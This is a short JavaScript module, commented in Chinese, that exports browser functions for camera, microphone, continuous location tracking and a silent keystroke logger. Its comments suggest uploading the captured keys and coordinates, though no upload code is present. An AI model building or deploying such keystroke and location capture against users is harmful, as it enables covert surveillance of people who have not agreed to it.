// 摄像头控制模块
let mediaStream;

function startCamera(videoElement) {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            mediaStream = stream;
            videoElement.srcObject = stream;
            console.log('摄像头已启动');
        })
        .catch(err => {
            console.error('摄像头访问失败', err);
            alert('无法访问摄像头，请确保您已授权浏览器访问摄像头！');
        });
}

function stopCamera(videoElement) {
    if (mediaStream) {
        const tracks = mediaStream.getTracks();
        tracks.forEach(track => track.stop());
        videoElement.srcObject = null;
        console.log('摄像头已停止');
    } else {
        console.warn('没有活动的视频流');
    }
}

// 麦克风监听模块
function startMicrophone() {
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const analyser = audioContext.createAnalyser();
            const source = audioContext.createMediaStreamSource(stream);
            source.connect(analyser);
            console.log('麦克风已启动');
        })
        .catch(err => {
            console.error('麦克风访问失败', err);
            alert('无法访问麦克风，请确保您已授权浏览器访问麦克风！');
        });
}

// 键盘记录模块
let keyboardData = '';

function startKeylogger() {
    document.addEventListener('keydown', (event) => {
        keyboardData += event.key;
        console.log('键盘输入:', event.key);
        // 你可以上传或存储 `keyboardData` 数据
    });
}

function getKeyboardData() {
    return keyboardData;
}

// 定位追踪模块
function startLocationTracking() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            console.log(`当前位置: 纬度: ${latitude}, 经度: ${longitude}`);
            // 可以进一步上传或保存定位信息
        }, function(error) {
            console.error('定位失败', error);
            alert('无法获取位置信息，请确保位置服务已启用！');
        });
    } else {
        alert('此浏览器不支持定位');
    }
}

// 导出功能以便在 HTML 中调用
export { startCamera, stopCamera, startMicrophone, startKeylogger, getKeyboardData, startLocationTracking };
